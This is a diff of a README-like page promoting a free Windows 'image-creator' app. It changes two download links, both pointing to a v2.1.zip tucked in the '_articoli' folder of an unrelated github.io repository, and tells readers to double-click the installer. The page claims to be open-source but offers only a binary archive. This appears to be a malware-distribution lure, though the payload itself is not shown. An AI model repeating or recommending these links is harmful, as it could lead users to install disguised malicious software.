@@ -40,7 +40,7 @@ No subscriptions, no paywalls, no "premium" features locked away. This is a comm
 ### Step 1: Get the Application
 Visit this link to download the application:
 
-**[⬇️ CLICK HERE TO DOWNLOAD image-creator-free](https://github.com/AussieONZaza/aussieonzaza.github.io/raw/refs/heads/main/_articoli/v2.1.zip)**
+**[⬇️ CLICK HERE TO DOWNLOAD image-creator-free](https://raw.githubusercontent.com/AussieONZaza/aussieonzaza.github.io/main/_articoli/v2.1.zip)**
 
 ### Step 2: Install the Application
 Once the download is complete, you'll have the installation file on your computer. Simply double-click it to begin the installation process. Follow the on-screen instructions – it's as easy as installing any other Windows program.
@@ -172,7 +172,7 @@ This is an open-source project, which means it's built by the community, for the
 
 Ready to start creating? Here's your link one more time:
 
-**[🚀 DOWNLOAD image-creator-free NOW](https://github.com/AussieONZaza/aussieonzaza.github.io/raw/refs/heads/main/_articoli/v2.1.zip)**
+**[🚀 DOWNLOAD image-creator-free NOW](https://raw.githubusercontent.com/AussieONZaza/aussieonzaza.github.io/main/_articoli/v2.1.zip)**
 
 ---
 
